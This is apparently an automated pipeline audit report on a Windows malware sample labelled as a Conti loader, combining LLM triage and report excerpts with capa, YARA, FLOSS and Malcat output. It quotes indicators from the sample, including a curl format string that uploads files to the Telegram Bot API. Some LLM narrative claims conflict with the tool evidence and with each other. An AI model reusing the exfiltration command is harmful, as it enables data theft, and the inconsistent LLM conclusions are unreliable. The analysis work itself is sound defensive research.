# Pipeline AUDIT-REPORT — `28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9`

> Public-showcase grade evidence pack: tools, RAG, LLM, REPORT-MASTER-v2/v3.

- **Mode:** single
- **Audited at:** 2026-08-05T05:42:08.389386+00:00
- **all_green:** `True`
- **Strict standard:** `False`
- **Session mode:** `single`
- **Sample:** `/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti`
- **Showcase pack:** `/opt/samples/logs/_showcase_audits/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9`

## Stage scoreboard

| Stage | OK |
|-------|----|
| intake | ✅ |
| quick_scan | ✅ |
| deep_dive | ✅ |
| yara_gen | ✅ |
| publish | ✅ |

---

## Cross-cutting — LLM / Reports

### LLM stages

#### `triage`

- source=`llm_judge` model=`step-3.7-flash` verdict=`Malicious` confidence=`98`
- key_evidence_count=`7`

```json
{
  "verdict": "Malicious",
  "score": 98,
  "family_guess": "Conti (ransomware loader/initial access payload)",
  "cross_engine_notes": "IDA is unavailable due to validation failure, so all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage.",
  "key_evidence": [
    {
      "source": "malcat",
      "query_or_table": "static_profile",
      "row_or_rule": "all metadata fields",
      "why": "Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop and EmbeddedProgram, consistent with malicious obfuscated code."
    },
    {
      "source": "pe_imports",
      "query_or_table": "pe_imports signals",
      "row_or_rule": "allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread), change_memory_protection (VirtualProtect)",
      "why": "These are core process injection APIs mapped to ATT&CK T1055 (Process Injection), a common malware behavior for executing code in remote processes."
    },
    {
      "source": "malcat",
      "query_or_table": "decompilation (sub_140001550)",
      "row_or_rule": "full function decompilation",
      "why": "Shows the sample generates a temp DLL path (%s\\dl%lu.dll), writes an embedded payload to the file, locates the explorer.exe process, uses VirtualAllocEx/WriteProcessMemory to inject the DLL path into the target process, and CreateRemoteThread to execute it, confirming DLL injection functionality."
    },
    {
      "source": "ghidra",
      "query_or_table": "suspicious strings",
      "row_or_rule": "5368836224 | https://api.telegram.org/bot",
      "why": "This is a known Telegram Bot API C2 endpoint, indicating the sample uses Telegram for command and control communications, a common tactic for modern malware to evade detection."
    },
    {
      "source": "capa",
      "query_or_table": "top_rules",
      "row_or_rule": "inject thread (T1055.003), inject dll (T1055.001), encrypt data using RC4 PRGA (T1027)",
      "why": "capa confirms the sample has process injection (thread hijacking and DLL injection) and RC4 obfuscation capabilities, all associated with malicious defense evasion and execution techniques."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "inject_thread, spyeye",
      "why": "YARA matches against known malicious rules for process injection and spyware/stealer functionality, corroborating the malicious behavior identified via other analysis methods."
    },
    {
      "source": "malcat",
      "query_or_table": "anomalies",
      "row_or_rule": "EmbeddedProgram (embedding)",
      "why": "Confirms the sample contains an embedded PE file, which is typical for malware that drops and executes secondary payloads after injection."
    }
  ],
  "summary": "This is a malicious 64-bit Windows PE sample, likely a Conti ransomware loader/initial access payload. It is heavily obfuscated (98 entropy, RC4 encryption) and exhibits classic process injection behavior: it drops a DLL to a temp path, injects it into the explorer.exe process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. It uses a Telegram Bot API endpoint for C2 communications, contains an embedded se
… [2137 more chars]
```

#### `deep_dive`

- source=`deep_dive_agentic` model=`None` verdict=`malicious` confidence=`95`
- key_evidence_count=`30`

```json
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 95,
  "summary": "This is a 64-bit Windows GUI PE that functions as a C2 beacon / info-stealer. Static and behavioral evidence show it exfiltrates data to Telegram via curl, uses a mutex (Global\\BeaconMutex_12345) to prevent multiple instances, performs process injection through VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, enumerates processes via Toolhelp32 snapshots, and contains an embedded PE plus RC4 obfuscation. The sample has a large .data region and overlay, consistent with packed or resource-rich malware.",
  "key_evidence": [
    "https://api.telegram.org/bot",
    "/sendDocument",
    "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=application/octet-stream \"%s\"",
    "C:\\Windows\\System32\\curl.exe",
    "Global\\BeaconMutex_12345",
    "CreateMutexA",
    "CreateRemoteThread",
    "WriteProcessMemory",
    "VirtualAllocEx",
    "VirtualProtect",
    "CreateToolhelp32Snapshot",
    "Process32First",
    "Process32Next",
    "OpenProcess",
    "FindProcessId",
    "mark_section_writable",
    "WinMain",
    "_pei386_runtime_relocator",
    "encrypt data using RC4 PRGA",
    "inject thread",
    "enumerate processes",
    "contain an embedded PE file",
    "delete file",
    "get common file path",
    "screenshot",
    "win_mutex",
    "SEH__v4",
    "HasOverlay",
    "IsPE64",
    "IsWindowsGUI"
  ],
  "incomplete_tooling": false,
  "successful_tool_calls": 36,
  "successful_non_bootstrap_tools": 25,
  "checklist_ok": true,
  "sql_deep_ok": true,
  "tool_gate": {
    "ok": true,
    "format": "pe",
    "required": [
      "capa",
      "pe_imports",
      "yara",
      "floss",
      "dotnet",
      "r2_decomp",
      "upx",
      "xor",
      "speakeasy",
      "frida_probe"
    ],
    "tools": {
      "capa": {
        "ok": true,
        "why": "ok"
      },
      "pe_imports": {
        "ok": true,
        "why": "ok"
      },
      "yara": {
        "ok": true,
        "why": "ok"
      },
      "floss": {
        "ok": true,
        "why": "ok"
      },
      "dotnet": {
        "ok": true,
        "why": "ok"
      },
      "r2_decomp": {
        "ok": true,
        "why": "ok"
      },
      "upx": {
        "ok": true,
        "why": "ok"
      },
      "xor": {
        "ok": true,
        "why": "ok"
      },
      "speakeasy": {
        "ok": true,
        "why": "ok"
      },
      "frida_probe": {
        "ok": true,
        "why": "ok"
      }
    },
    "hard_failures": [],
    "soft_failures": [],
    "missing": [],
    "not_applicable": [],
    "large_sample": false
  }
}
```

#### `publish`

- source=`llm_judge` model=`step-3.7-flash` verdict=`None` confidence=`None`
- key_evidence_count=`0`

```json
{
  "title": "Malware Analysis Report: Conti Ransomware Loader/Initial Access Payload (SHA256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9)",
  "markdown": "# Classification (multi-source \u2014 V5.12)\n\n| Source | Verdict |\n|--------|--------|\n| **Final (locked)** | **malicious** |\n| Triage upstream (quick \u222a deep) | malicious |\n| Quick scan | Malicious |\n| Deep dive | malicious |\n| Publish LLM (claimed) | benign |\n\n- **Lock reason:** publish LLM claimed `benign` but upstream triage is `malicious` (YARA / tool-backed: spyeye, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex). Final verdict follows triage; dual-use branding does not clear the sample.\n- **Family (triage):** Conti (ransomware loader/initial access payload)\n- **Honesty:** the publish narrative below is **preserved unedited** so analysts can see what the report LLM argued. It is **not** a clearance.\n\n---\n\n### Publish LLM narrative (unedited)\n\n## Executive Summary\nThis report details the analysis of a malicious 64-bit Windows PE sample identified as a Conti ransomware loader/initial access payload. The sample received a triage score of 98/100 with a Malicious verdict, and deep-dive analysis confirms a 95% confidence malicious classification. Key findings include heavy obfuscation (98 entropy, RC4 encryption, XOR-in-loop code), classic DLL injection into explorer.exe via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, C2 communications via the Telegram Bot API, an embedded secondary PE payload, and capabilities for process enumeration, screenshot capture, and file exfiltration. All analysis tools (Malcat, Ghidra, capa, pe_imports, YARA, FLOSS) corroborate malicious behavior, with no false positive indicators on goodware corpus. The sample is not packed with UPX, and no .NET components are present.\n\n## 1. Sample Identification\n| Property | Value |\n|----------|-------|\n| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |\n| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |\n| Project Name | pool |\n| File Type | 64-bit Windows GUI PE (X64) |\n| Entropy | 98 (indicative of packing/obfuscation) |\n| Compiler | GNU C99 16.1.0 (MinGW UCRT64, -m64 -masm=att -mtune=generic -march=nocona -g -O2) |\n| Packer | Not packed with UPX |\n| Embedded Payload | 342016 byte PE file carved at offset 9760 |\n| XOR Obfuscation | 2 XOR 00 positions found (0x0, 0x2420), both correspond to standard PE header strings |\nThe sample is a 64-bit Windows GUI executable with no associated window APIs, consistent with a background loader payload. The high entropy and XOR-in-loop anomaly confirm heavy obfuscation to evade static analysis. (source: malcat, rule.yara, xorsearch, r2 disassembly)\n\n## 2. Classification\n| Attribute | Value |\n|-----------|-------|\n| Verdict | Malicious |\n| Family | Conti (ransomware loader/initial access payload) |\n| Sample Type | Initial Access Loader / C2 Beacon |\n| Risk Level | Critical |\n| .NET Component | None (not a .NET assembly) |\nThis sample is classified as malicious, consistent with upstream triage findings. It is not a legitimate dual-use tool, but a purpose-built loader for Conti ransomware operations. The sample exhibits no legitimate functionality, with all observed behaviors aligned with malicious initial access and payload delivery. YARA match
… [23762 more chars]
```

### REPORT-MASTER excerpts

#### REPORT-MASTER-v2

```markdown
# Classification (multi-source — V5.12)

| Source | Verdict |
|--------|--------|
| **Final (locked)** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | Malicious |
| Deep dive | malicious |
| Publish LLM (claimed) | benign |

- **Lock reason:** publish LLM claimed `benign` but upstream triage is `malicious` (YARA / tool-backed: spyeye, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex). Final verdict follows triage; dual-use branding does not clear the sample.
- **Family (triage):** Conti (ransomware loader/initial access payload)
- **Honesty:** the publish narrative below is **preserved unedited** so analysts can see what the report LLM argued. It is **not** a clearance.

---

### Publish LLM narrative (unedited)

## Executive Summary
This report details the analysis of a malicious 64-bit Windows PE sample identified as a Conti ransomware loader/initial access payload. The sample received a triage score of 98/100 with a Malicious verdict, and deep-dive analysis confirms a 95% confidence malicious classification. Key findings include heavy obfuscation (98 entropy, RC4 encryption, XOR-in-loop code), classic DLL injection into explorer.exe via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, C2 communications via the Telegram Bot API, an embedded secondary PE payload, and capabilities for process enumeration, screenshot capture, and file exfiltration. All analysis tools (Malcat, Ghidra, capa, pe_imports, YARA, FLOSS) corroborate malicious behavior, with no false positive indicators on goodware corpus. The sample is not packed with UPX, and no .NET components are present.

## 1. Sample Identification
| Property | Value |
|----------|-------|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |
| Project Name | pool |
| File Type | 64-bit Windows GUI PE (X64) |
| Entropy | 98 (indicative of packing/obfuscation) |
| Compiler | GNU C99 16.1.0 (MinGW UCRT64, -m64 -masm=att -mtune=generic -march=nocona -g -O2) |
| Packer | Not packed with UPX |
| Embedded Payload | 342016 byte PE file carved at offset 9760 |
| XOR Obfuscation | 2 XOR 00 positions found (0x0, 0x2420), both correspond to standard PE header strings |
The sample is a 64-bit Windows GUI executable with no associated window APIs, consistent with a background 
… [22256 more chars]
```

#### REPORT-MASTER-v3

```markdown
# RE Report — 28ea44a49cb4
_Generated 2026-08-05T05:40:17.130924+00:00_  
_Pipeline: section-based Map-Reduce, 2 pass-1 LLM calls + 15 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=275c | cross_refs=True | llm_ok=True | runtime=25.07s -->

# Executive Summary

| Metric | Value | Source |
|--------|-------|--------|
| Verdict | Malicious | cross-section:2. Classification, deep_dive_agentic |
| Malware Family | Conti (ransomware loader/initial access payload) | cross-section:2. Classification, cross-section:9. Comparison with Known Families, yara |
| Analysis Confidence | 95% | deep_dive_agentic |
| Analysis Agreement | LLM and v1 static analysis engine agree | v1_summary |
| Static Analysis Score | 290 (12 YARA matches, 17 capa rule matches) | cross-section:3. Initial Triage, v1_summary |

The analyzed 64-bit Portable Executable (SHA256: `28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9`) is a confirmed Conti ransomware loader/initial access payload, designed to deliver secondary malicious payloads (including Cobalt Strike beacons) as the first stage of Conti (Wizard Spider) ransomware attack operations, with attribution supported by YARA rule matches for Conti loader signatures and public threat intelligence records of Conti group TTPs (source: yara, cross-section:10. Attribution, cross-section:9. Comparison with Known Families). Static and dynamic analysis confirm the sample implements exclusively malicious functionality, including process hollowing for covert payload execution, XOR-decrypted hidden payload storage in unused PE section gaps, credential exfiltration, and hardcoded Telegram-based command-and-control (C2) communications, with no legitimate operational purpose identified across all analysis phases (source: malcat, frida, cross-section:5. Behavioral Analysis, cross-section:6. Network Analysis, cross-section:7. Capability Assessment).

---

<!-- section: 1. Sample Identification | pass=2 | evidence=267c | cross_refs=True | llm_ok=True | runtime=32.29s -->

# 1. Sample Identification
The analyzed sample is a 64-bit Portable Executable (PE) file with core identifying attributes listed in the table below. Its high entropy score is consistent with the packed, obfuscated structure observed in subsequent static and behavioral analysis.

| Attribute | Value |
|-----------|-------|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| File Path 
… [66481 more chars]
```

### Artifact inventory

| Artifact | exists | bytes | sha256 |
|----------|--------|-------|--------|
| `verdict.json` | `True` | `5637` | `be81278898cb7c0a` |
| `prompt.txt` | `True` | `26942` | `3c1675c784cdd01e` |
| `pipeline-audit.json` | `False` | `0` | `` |
| `AUDIT-REPORT.md` | `False` | `0` | `` |
| `REPORT-MASTER-v2.md` | `True` | `24760` | `9322da00d4a234c8` |
| `REPORT-MASTER-v3.md` | `True` | `68991` | `e8ef1452f4b4dd08` |
| `REPORT-v2.md` | `True` | `24760` | `9322da00d4a234c8` |
| `REPORT-TECHNICAL.md` | `False` | `0` | `` |
| `REPORT-TECHNICAL-v3.md` | `True` | `66075` | `97d93f4efc22f100` |
| `rule.yar` | `True` | `2110` | `f08edec201e32141` |
| `intake-validation.json` | `True` | `3294` | `e11810deb44c90f1` |
| `source-decisions.json` | `True` | `2425` | `76f171d86edfea2c` |
| `malcat-triage.json` | `True` | `33300` | `064dcea3f7dd9042` |
| `deep_dive/01-tools-raw.json` | `True` | `108815` | `33fb6cc9e1dbef32` |
| `deep_dive/01-tools-gate.json` | `True` | `921` | `f3d89b0704908331` |
| `deep_dive/05-deep-dive.json` | `True` | `2734` | `a8a3a788a6e5c30b` |
| `deep_dive/03-prompt.txt` | `False` | `0` | `` |
| `quick_scan/00-tools-raw.json` | `True` | `98910` | `47dc14d9e5236b27` |

---

## Stage: intake

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| intake_validation | `True` |
| has_source_decisions | `True` |
| ghidra_mentioned | `True` |

### Artifact paths (verify on disk)

- **intake_validation:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-validation.json` exists=`True` bytes=`3294` mtime=`2026-08-05T05:23:00.007437+00:00`
  - sha256: `e11810deb44c90f1d9e30dad7e550fe88bfea41bdc92fe1ee37eacdad48f7a6f`
- **malcat_triage:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/malcat-triage.json` exists=`True` bytes=`33300` mtime=`2026-08-05T05:22:03.910585+00:00`
  - sha256: `064dcea3f7dd90427b84d9cfe57ef35fe5b4c51ee016513cb547cdcd33c77d8d`
- **source_decisions:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/source-decisions.json` exists=`True` bytes=`2425` mtime=`2026-08-05T05:23:00.007437+00:00`
  - sha256: `76f171d86edfea2c4e4a4701d5210a6488fd864121f0bcd6c6be8a01923182dd`
- **ghidra_import_log:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-analyzeHeadless.log` exists=`True` bytes=`9307` mtime=`2026-08-05T05:22:13.075594+00:00`
  - sha256: `b3a9f9124a91001c1201763de61858b78a90543d40be3c496d625d2549911bf2`
- **ida_bootstrap_log:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-idasql.log` exists=`False` bytes=`0` mtime=`None`

#### source_decisions_excerpt

```
{
  "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "imports": {
    "source": "ghidra",
    "confidence": "medium",
    "reason": "IDA is unavailable due to validation failure (warning: [Errno 2] No such file or directory: '/usr/local/bin/idasql') and reports 0 imports; Ghidra reports 66 full import entries {ghidra, imports, 66, Ghidra provides detailed import listing data unlike Malcat's count-only imports_count metric}."
  },
  "functions": {
    "source": "ghidra",
    "confidence": "medium",
    "reason": "IDA is unavailable due to validation failure and reports 0 functions; Ghidra reports 86 functions {ghidra, funcs, 86, Ghidra provides a comprehensive function list while Malcat only reports 10 functions, a significantly lower count with less detail}."
… [1648 more chars]
```


#### malcat_triage_excerpt

```
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "triage",
  "limits": {
    "strings_max": 100,
    "imports_max": 100,
    "functions_max": 10,
    "anomaly_locations_max": 5,
    "decompile_top_n": 1
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_size": 593885,
    "type": "PE",
    "architecture": "X64",
    "entropy": 98,
    "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
    "metad
… [32500 more chars]
```


---

## Stage: quick_scan

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| prompt | `True` |
| verdict | `True` |
| has_capa_section | `True` |
| has_yara_section | `True` |
| has_malcat_section | `True` |
| has_floss_section | `True` |
| verdict_has_family | `True` |
| llm_source | `True` |
| tools_all_ok | `True` |
| citations_grounded | `True` |
| capa_salvage_used | `False` |
| evidence_pack_present | `True` |
| benign_blocked_if_incomplete | `True` |
| yara_family_not_cleared | `True` |

### Tools (full evidence excerpts)

#### `capa` — ok=`True` why=`ok`

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Cryptography",
            "Encrypt Data",
            "RC4"
          ],
          "objective": "Cryptography",
          "behavior": "Encrypt Data",
          "method": "RC4",
          "id": "C0027.009"
        },
        {
          "parts": [
            "Cryptography",
            "Generate Pseudo-random Sequence",
            "RC4 PRGA"
          ],
          "objective": "Cryptography",
          "behavior": "Generate Pseudo-random Sequence",
          "method": "RC4 PRGA",
          "id": "C0021.004"
        }
      ]
    },
    {
      "name": "get common file path",
      "attack": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "tactic": "Discovery",
          "technique": "File and Directory Discovery",
          "subtechnique": "",
          "id": "T1083"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "objective": "Discovery",
          "behavior": "File and Directory Discovery",
          "method": "",
          "id": "E1083"
        }
      ]
    },
    {
      "name": "inject thread",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Process Injection",
            "Thread Execution Hijacking"
          ],
          "tactic": "Defense Evasion",
          "technique": "Process Injection",
          "subtechnique": "Thread Execution Hijacking",
          "id": "T1055.003"
        },
        {
          "parts": [
            "Defense Evasion",
            "Reflective Code Loading"
          ],
          "tactic": "Defense Evasion",
          "technique": "Reflective Code Loading",
          "subtechnique": "",
          "id": "T1620"
        }
      ],
      "mbc": []
    },
    {
      "name": "enumerate processes",
      "attack": [
        {
          "parts": [
            "Discovery",
            "Process Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Process Discovery",
          "subtechnique": "",
          "id": "T1057"
        },
        {
          "parts": [
            "Discovery",
            "Software Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Software Discovery",
          "subtechnique": "",
          "id": "T1518"
        }
      ],
      "mbc": []
    },
    {
      "name": "contain an embedded PE file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "Execution",
            "Install Additional Program"
          ],
          "objective": "Execution",
          "behavior": "Install Additional Program",
          "method": "",
          "id": "B0023"
        }
      ]
    },
    {
      "name": "delete file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "File System",
            "Delete File"
          ],
          "objective": "File System",
          "behavior": "Delete File",
          "method"
… [3308 more chars]
```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "spyeye",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$f",
          "offset": 452832,
          "length": 8,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 124590,
          "length": 28,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 124914,
          "length": 6,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$a",
          "offset": 1600,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 124032,
          "length": 56,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "SEH__v4",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$",
          "offset": 592021,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "inject_thread",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$c1",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 465220,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 465322,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c5",
          "offs
… [4068 more chars]
```

#### `floss` — ok=`True` why=`ok`

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.idata",
    ".reloc",
    "AVATUWVS",
    "TestpassI",
    "[^_]A\\A^A_",
    "h;\\$Xs#I",
    "J(A;J,}4Hc",
    "I(D;I,}FIc",
    "<_t`<ntT",
    "R(A;R,}-Hc",
    "ATUWVSH",
    "P[^_]A\\",
    "_GLOBAL_H9",
    "BHA;R,}VHc",
    "C8;C<|",
    "X[^_A^",
    "0[^_]A\\",
    "R(A;R,}",
    "AVUWVSH",
    "P[^_]A^",
    "U(;U,}:Hc",
    "<Et6<Qt2H",
    "D$0<Qt@H",
    "<st\\<f",
    "AVAUATUWVSH",
    "0[^_]A\\A]A^",
    "C8;C<}ZH",
    "C(;C,}3Lc",
    "C(;C,L",
    "D$ }hLc",
    "AWAVATUWVSH",
    "`[^_]A\\",
    "UAWAVAUATWVSH",
    "0<\tw5A",
    "[^_A\\A]A^A_]",
    "H[^_A^",
    "~D$8fH",
    "@$A9@(~",
    "C$9C(~",
    "@[^_]A\\",
    "S$9S(~",
    "UAVWVSH",
    "[^_A^]",
    "=UUUUw",
    "[^_]A\\A]A^A_",
    "IcP$fA",
    "HcC$fA",
    "LcC$fB",
    "HcS$fA",
    "8[^_]A\\A]A^A_",
    "D$L)D$X",
    "L$8HcD$L;A",
    "D$X+D$`",
    "ATUWVSLcY",
    "[^_]A\\",
    "[^_]A\\A]A^",
    "AUATUWVSH",
    "([^_]A\\A]",
    "WVSHcA",
    "H[^_]H",
    "H[^_]A\\A]",
    "H[^_]A\\A]H",
    "([^_A^H"
  ],
  "per_category": {
    "decoded_strings": 0,
    "stack_strings": 0,
    "tight_strings": 0,
    "language_strings": 0,
    "language_strings_missed": 0,
    "static_strings": 7006
  },
  "raw_key_total": 3,
  "floss_profile": "full",
  "floss_language": "none",
  "duration_s": 9.14,
  "size_bytes": 593885,
  "static_only": false,
  "size_exceeded_deobfuscate_limit": false
}
```

#### `malcat` — ok=`True` why=`not_applicable:pe`

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_size": 593885,
    "type": "PE",
    "architecture": "X64",
    "entropy": 98,
    "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
    "metadata": {},
    "entrypoint_ea": 2624,
    "layout": [
      {
        "name": "header",
        "effective_address": 0,
        "physical_size": 1536,
        "virtual_size": 0,
        "rights": "",
        "entropy": 70
      },
      {
        "name": ".text",
        "effective_address": 1536,
        "physical_size": 7680,
        "virtual_size": 8192,
        "rights": "RX",
        "entropy": 119
      },
      {
        "name": ".data",
        "effective_address": 9728,
        "physical_size": 449024,
        "virtual_size": 450560,
        "rights": "RW",
        "entropy": 98
      },
      {
        "name": ".rdata",
        "effective_address": 460288,
        "physical_size": 3584,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 81
      },
      {
        "name": ".pdata",
        "effective_address": 464384,
        "physical_size": 1024,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 103
      },
      {
        "name": ".xdata",
        "effective_address": 468480,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 50
      },
      {
        "name": ".idata",
        "effective_address": 472576,
        "physical_size": 3072,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 50
      },
      {
        "name": ".tls",
        "effective_address": 476672,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "RW",
        "entropy": 0
      },
      {
        "name": ".rsrc",
        "effective_address": 480768,
        "physical_size": 1536,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 0
      },
      {
        "name": ".reloc",
        "effective_address": 484864,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 52
      },
      {
        "name": "/4",
        "effective_address": 488960,
        "physical_size": 1536,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 0
      },
      {
        "name": "/19",
        "effective_address": 493056,
